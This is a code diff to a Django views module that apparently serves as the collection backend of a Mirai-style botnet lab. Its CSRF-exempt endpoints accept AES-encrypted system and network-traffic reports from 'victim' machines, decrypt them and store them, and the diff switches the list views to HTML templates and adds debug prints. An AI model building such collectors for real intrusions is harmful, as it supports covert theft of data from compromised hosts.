@@ -12,10 +12,13 @@ from Crypto.Util.Padding import unpad
 import urllib.parse
 from django.utils import timezone
 from datetime import datetime
+from django.views.generic import ListView
 from django.core import serializers
+from django.shortcuts import render
 
 SECRET_KEY_PATH = "/home/attacker/tttest/Mirai-botnet/victim/secret.key"
 IV_PATH = "/home/attacker/tttest/Mirai-botnet/victim/iv.txt"
+
 
 # Function to decrypt data using AES
 
@@ -32,22 +35,28 @@ def decrypt_data(encrypted_message):
     with open(IV_PATH, 'r') as iv_file:
         iv_hex = iv_file.read().strip()
         iv = bytes.fromhex(iv_hex)  # Convert hex IV to bytes
+    print("encrypted message : " , encrypted_message)
     encrypted_message_bytes = base64.b64decode(encrypted_message)
 
     # Perform the AES decryption
     cipher = AES.new(secret_key, AES.MODE_CBC, iv)
     decrypted_message_bytes = unpad(cipher.decrypt(encrypted_message_bytes), AES.block_size)
-
+    
+    
     return decrypted_message_bytes.decode('utf-8')
 
 # SystemData view for handling system data
 @method_decorator(csrf_exempt, name='dispatch')
 class SystemDataList(View):
+    
     def get(self, request):
-        # Retrieve all system data records
-        system_data_records = SystemData.objects.all()
-        data = serializers.serialize('json', system_data_records)
-        return JsonResponse(data, safe=False)
+        # Retrieve all network traffic records
+        systemData = SystemData.objects.all()
+
+        # Pass the records to the template as context
+        return render(request, 'monitoring/system_data_list.html', {
+            'system_data_list': systemData
+        })
 
     def post(self, request):
         try:
@@ -59,7 +68,7 @@ class SystemDataList(View):
             decrypted_data = decrypt_data(test1)
             parsed_data = urllib.parse.parse_qs(decrypted_data)
             # Print the parsed data
-
+            print(parsed_data)
             for key, value in parsed_data.items():
                 parsed_data[key] = value[0].strip("'")
             data = parsed_data
@@ -105,11 +114,14 @@ class SystemDataDetail(View):
 # NetworkTraffic view for handling network traffic
 @method_decorator(csrf_exempt, name='dispatch')
 class NetworkTrafficList(View):
+
     def get(self, request):
         # Retrieve all network traffic records
         network_traffic_records = NetworkTraffic.objects.all()
-        data = serializers.serialize('json', network_traffic_records)
-        return JsonResponse(data, safe=False)
+        # Pass the records to the template as context
+        return render(request, 'monitoring/network_traffic_list.html', {
+            'network_traffic_list': network_traffic_records
+        })
 
     def post(self, request):
         try:
@@ -131,6 +143,7 @@ class NetworkTrafficList(View):
             
             # Convert time_sent string to a datetime.time object
             time_sent_obj = datetime.strptime(time_sent_str, '%H:%M:%S.%f').time()
+            print("time " , time_sent_obj)
             # Create new network traffic record
             network_traffic = NetworkTraffic.objects.create(
                 interface=data.get('interface'),
